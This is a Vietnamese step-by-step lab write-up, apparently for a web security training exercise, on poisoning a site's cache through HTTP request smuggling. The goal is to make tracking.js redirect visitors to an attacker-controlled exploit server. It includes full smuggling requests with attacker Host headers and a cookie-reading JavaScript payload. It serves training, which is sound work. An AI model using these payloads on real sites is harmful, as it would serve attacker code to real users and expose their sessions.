# Lab: Poison cache bằng HTTP request smuggling (Web cache poisoning)

Mục tiêu: dùng kỹ thuật request smuggling để làm server cache trả về một resource (ví dụ `/resources/js/tracking.js`) được redirect tới máy tấn công — từ đó chèn payload (ví dụ JavaScript) vào cache và khiến nạn nhân tải mã độc.

Yêu cầu trước: bạn có trang exploit server (Burp Collaborator / Exploit server) có hostname riêng, và bạn có thể upload file tĩnh lên đó.

1. Tìm request mục tiêu

- Mở một bài blog trên ứng dụng, click "Next post" để sinh ra request GET/POST xảy ra khi chuyển trang. Ta sẽ smuggle request đó.

2. Ý tưởng exploit (tóm tắt)

- Smuggle một request GET tới endpoint nội bộ (ví dụ `/post/next?postId=3`) nhưng đặt header `Host` là hostname của exploit server (hoặc bất kỳ host bạn kiểm soát).
- Nếu proxy/nguyên lý cache lưu response dựa vào request (kèm Host), bạn có thể gây cache một response có Location/Redirect trỏ tới exploit server.
- Sau đó, gọi resource mà trang dùng (ví dụ `/resources/js/tracking.js`) — nếu cache đã bị "poisoned", server trả redirect tới exploit server và nạn nhân sẽ load file JS của bạn.

3. Payload mẫu để smuggle (ví dụ):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Giải thích:

- Front-end sẽ thấy một request hợp lệ và forward xuống back-end; back-end có thể xử lý phần `GET /post/next...` như một request khác với Host `attacker.example.com`.
- Nếu cache server lưu response cho URL `/post/next?postId=3` dựa trên Host header, nó có thể cache phiên bản trả về có Location/redirect tới host attacker.

4. Chuẩn bị file trên exploit server

- Trên exploit server, tạo file `POST` (hoặc `/post`) kiểu `text/javascript` với nội dung đơn giản để kiểm tra, ví dụ:

```javascript
alert(document.cookie);
```

5. Poison cache bằng request đã điều chỉnh (ví dụ dùng hostname exploit server):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

6. Kiểm tra resource bị poisoned

- Gửi request sau để lấy `tracking.js` (hoặc resource tương ứng):

```http
GET /resources/js/tracking.js HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: close
```

- Nếu cache đã bị poisoned thành công, response sẽ là redirect (3xx) tới `YOUR-EXPLOIT-SERVER-ID.exploit-server.net` hoặc trực tiếp trả nội dung JS từ exploit server.

7. Xác minh và lặp lại

- Lặp lại request tới `tracking.js` nhiều lần; nếu mỗi lần đều trả redirect tới exploit server, cache đã bị thay đổi.
- Mở trang người dùng ở chế độ incognito để kiểm tra rằng khách truy cập thực tế sẽ bị điều hướng đến exploit server và thực thi JavaScript.
